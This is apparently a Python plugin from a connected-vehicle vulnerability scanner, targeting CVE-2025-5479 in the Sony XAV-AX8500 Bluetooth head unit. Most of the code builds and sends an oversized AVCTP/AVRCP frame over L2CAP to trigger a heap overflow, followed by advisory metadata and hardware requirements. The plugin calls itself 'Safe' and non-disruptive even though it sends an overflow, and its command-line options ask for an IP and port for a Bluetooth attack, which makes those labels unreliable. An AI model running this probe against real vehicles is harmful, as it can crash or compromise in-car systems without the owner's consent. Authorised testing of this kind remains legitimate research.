#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    info = {"adapter_found": False, "hcitool_available": False}
    try:
        r = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            if line.strip().startswith("hci"):
                info["adapter_found"] = True
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _send_avctp_heap_overflow(mac: str) -> dict:
    """
    CVE-2025-5479: AVCTP heap overflow - send AVCTP command frame with
    oversized body to overflow heap buffer in Sony BT stack.
    PSM 0x0017 = AVCTP
    """
    result = {"sent": False, "error": ""}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(8.0)
        bdaddr_bytes = bytes(int(b, 16) for b in reversed(mac.split(":")))
        addr = struct.pack("<H H 6s H B", AF_BLUETOOTH, 0x0017, bdaddr_bytes, 0, 0)
        sock.connect(addr)

        # AVCTP header: transaction=0, packet_type=Single(0), c/r=Command(0)
        # PID = AVRCP (0x110E), oversized body for heap overflow
        avctp_hdr = struct.pack(">B H", 0x00, 0x110E)
        # AVRCP UNIT INFO command padded to trigger heap overflow (crafted length mismatch)
        avrcp_payload = b"\x30\xFF" + b"\xAB" * 512  # Oversized AVRCP command
        frame = avctp_hdr + avrcp_payload
        sock.sendall(frame)
        result["sent"] = True
        sock.close()
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")

    evidence = {
        "cve": "CVE-2025-5479",
        "target": bt_mac or "Sony XAV-AX8500 BT head unit",
        "technique": (
            "AVCTP heap overflow probe: connect to PSM 0x0017 (AVCTP) and send "
            "oversized AVRCP command frame to trigger heap overflow"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-5479",
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    if not adapter_info["adapter_found"]:
        evidence["note"] = "No BT adapter available"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if not bt_mac:
        evidence["note"] = "bluetooth_mac parameter required"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    avctp_result = _send_avctp_heap_overflow(bt_mac)
    evidence["avctp_probe"] = avctp_result

    if avctp_result["sent"]:
        vulnerable = None
        evidence["note"] = (
            "AVCTP overflow frame delivered to Sony XAV-AX8500. "
            "Monitor for BT stack crash/restart to confirm CVE-2025-5479."
        )
    else:
        vulnerable = None
        evidence["note"] = f"AVCTP probe failed: {avctp_result['error']}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
    }


VULN = {
    "id": 26,
    "cve": "CVE-2025-5479",
    "year": 2025,
    "domain": "蓝牙/IVI",
    "vendor_product": "Sony XAV-AX8500",
    "component": "Bluetooth stack",
    "type": "Bluetooth AVCTP堆溢出/RCE",
    "summary": "AVCTP协议实现堆缓冲区溢出，配对恶意设备后可RCE。",
    "source_description": "Sony XAV-AX8500 Bluetooth AVCTP Protocol Heap-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Sony XAV-AX8500 devices. An attacker must first obtain the ability to pair a malicious Bluetooth device with the target system in order to exploit this vulnerability.\n\nThe specific flaw exists within the implementation of the Bluetooth AVCTP protocol. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-26290.",
    "poc_status": "有ZDI公开技术公告；未见官方PoC代码",
    "research_value": "非常适合IVI蓝牙协议栈模糊测试与攻击链研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5479",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-5479",
        "https://www.zerodayinitiative.com/advisories/ZDI-25-356/",
        "https://www.sony.com/electronics/support/mobile-cd-players-digital-media-players-xav-series/xav-ax8500/software/00344092",
        "https://cveawg.mitre.org/api/cve/CVE-2025-5479"
    ],
    "affected": [
        {
            "vendor": "Sony",
            "product": "XAV-AX8500",
            "versions": [
                {
                    "version": "2.00.01",
                    "status": "affected"
                }

            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-5479",
        "Sony",
        "XAV-AX8500",
        "Bluetooth",
        "stack",
        "AVCTP",
        "RCE",
        "Protocol",
        "Heap-based",
        "Buffer",
        "Overflow",
        "Remote",
        "Code",
        "Execution",
        "Vulnerability",
        "vulnerability",
        "network-adjacent",
        "attackers",
        "execute",
        "arbitrary",
        "code",
        "installations",
        "devices",
        "must",
        "first",
        "obtain",
        "ability"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（Ubertooth One 推荐用于嗅探）', '或内置 HCI 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）或 USB（Ubertooth）',
    "tools":      ['BlueZ ≥ 5.48', 'Ubertooth 工具链', 'Wireshark + BT 插件'],
    "firmware":   'Ubertooth firmware 2020-12-R1（ubertooth-dfu）',
    "setup":      'ubertooth-util -v && hciconfig hci0 up',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc46CVE20255479RCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-046"
    meta_poc_name = 'CVE-2025-5479 RCE Active Validation'
    meta_cve_id = 'CVE-2025-5479'
    meta_severity = 'High'
    meta_protocol = 'bluetooth'
    meta_target_os = ['all']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-5479'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2025-5479']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "46_Sony_XAV_AX8500_BT_AVCTP_Heap_Overflow_RCE_Audit") if "VULN" in dir() else "46_Sony_XAV_AX8500_BT_AVCTP_Heap_Overflow_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc46CVE20255479RCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
